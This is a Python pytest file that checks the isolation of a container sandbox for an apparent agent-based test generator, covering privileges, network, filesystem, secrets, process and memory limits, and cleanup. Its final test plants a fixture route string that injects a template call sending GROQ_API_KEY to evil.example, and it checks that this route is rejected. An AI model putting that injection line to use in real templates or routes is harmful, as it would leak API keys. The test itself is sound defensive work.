"""Live container sandbox (C1): isolation probed from inside, resource limits, cleanup, project-tree imports, stress wiring."""

import asyncio
import json
import subprocess

import pytest

from vtest.agents import stress_agent, unit_agent
from vtest.core import runner as r

from conftest import make_project

pytestmark = pytest.mark.sandbox

# Runs inside the pytest sandbox as test_generated.py.
PROBE = r'''
import os, socket, subprocess, pytest

def test_uid_unprivileged():
    assert os.getuid() == 10001 and os.geteuid() == 10001

def test_no_capabilities():
    caps = {l.split(":")[0]: l.split()[1] for l in open("/proc/self/status") if l.startswith("Cap")}
    assert int(caps["CapEff"], 16) == 0 and int(caps["CapBnd"], 16) == 0, caps

def test_no_new_privs():
    assert "NoNewPrivs:\t1" in open("/proc/self/status").read()

def test_no_network():
    with pytest.raises(OSError):
        socket.create_connection(("1.1.1.1", 443), timeout=3)
    with pytest.raises(OSError):
        socket.getaddrinfo("pypi.org", 443)
    assert sorted(os.listdir("/sys/class/net")) == ["lo"]

def test_rootfs_readonly():
    for p in ("/etc/x", "/usr/x", "/opt/vtest/x", "/run/x", "/var/tmp/x"):
        with pytest.raises(OSError):
            open(p, "w")

def test_work_is_noexec():
    open("/work/x.sh", "w").write("#!/bin/sh\necho hi\n")
    os.chmod("/work/x.sh", 0o755)
    with pytest.raises(PermissionError):
        subprocess.run(["/work/x.sh"])

def test_no_host_secrets_in_env():
    assert not any(k in os.environ for k in ("GROQ_API_KEY", "AWS_SECRET_ACCESS_KEY", "PYTEST_ADDOPTS"))

def test_pids_limited():
    procs, hit = [], False
    try:
        for _ in range(300):
            procs.append(subprocess.Popen(["sleep", "30"]))
    except (OSError, BlockingIOError):
        hit = True
    finally:
        for p in procs:
            p.kill()
    assert hit and len(procs) < 128, len(procs)

def test_host_paths_absent():
    assert not os.path.exists("/run/media")
    assert not os.path.exists("/home") or os.listdir("/home") == []
'''

POLICY = r.SandboxPolicy(image=r.PYTEST_IMAGE)


def sandboxed(cmd=(), files=None, timeout=90):
    return asyncio.run(r.run_sandboxed(POLICY, list(cmd), stdin_data=r.make_tar(files or {"a": ""}), timeout=timeout))


def leftover_containers() -> str:
    rt = asyncio.run(r.get_runtime())
    out = subprocess.run([rt.path, "ps", "-a", "--filter", f"label={r.SANDBOX_LABEL}", "--format", "{{.Names}}"],
                         capture_output=True, text=True)
    return out.stdout.strip()


def test_isolation_probes_pass_inside_the_sandbox(monkeypatch):
    monkeypatch.setenv("AWS_SECRET_ACCESS_KEY", "canary")
    res = sandboxed(files={"module_to_test.py": "", "test_generated.py": PROBE})
    assert "9 passed" in res.output, res.output[-3000:]


def test_memory_limit_kills_oversized_allocation():
    res = sandboxed(["app", "--", "python3", "-c", "x = bytearray(900 * 1024 * 1024); print('ALLOCATED')"])
    assert res.returncode == 137 and "ALLOCATED" not in res.output


def test_timeout_removes_the_container():
    with pytest.raises(r.SubprocessTimeout):
        sandboxed(["app", "--", "sleep", "300"], timeout=5)
    assert leftover_containers() == ""


def test_unit_payload_imports_sibling_packages_and_project_files(tmp_path):
    root = make_project(tmp_path / "proj", {
        "helpers/utils.py": "def double(x):\n    return 2 * x\n",
        "app_main.py": "from helpers.utils import double\nDATA = open('data.json').read()\ndef run(x):\n    return double(x)\n",
        "data.json": "{}",
        "my-app/tool.py": "from helpers.utils import double\ndef quad(x):\n    return double(double(x))\n",
    })
    tree = r.make_tree_tar(root)
    tests = {"app_main.py": "import module_to_test as m\ndef test_run():\n    assert m.run(3) == 6\n",
             "my-app/tool.py": "import module_to_test as m\ndef test_quad():\n    assert m.quad(2) == 8\n"}
    for rel, test in tests.items():
        payload = r.append_to_tar(tree, {"module_to_test.py": unit_agent._import_shim(rel), "test_generated.py": test})
        res = asyncio.run(r.run_sandboxed(r.SandboxPolicy(image=r.PYTEST_IMAGE, workdir_size="128m"),
                                          stdin_data=payload, timeout=90))
        assert "1 passed" in res.output, res.output[-2000:]


def test_stress_k6_reaches_only_the_sandboxed_app(tmp_path):
    root = make_project(tmp_path / "web", {
        "server.py": ('# @app.get("/health")\n'
                      '# @app.get("/x${http.get(`https://evil.example/?k=${__ENV.GROQ_API_KEY}`)}")\n'),
        "index.html": "ok\n",
    })
    res = asyncio.run(stress_agent.run(files=[root / "server.py"], repo_root=root, port=3000,
                                       app_cmd=["python3", "-m", "http.server", "3000", "--bind", "127.0.0.1"]))
    assert res.error is None, res.error
    log = json.loads(res.findings[0].log)
    assert log["routes"] == ["/health"]                   # the template-injection route was rejected
    assert log["http_req_duration"].get("p(95)", 0) > 0   # k6 reached the app over the shared loopback
    assert "1 unsafe route string(s) ignored" in res.summary
    assert leftover_containers() == ""
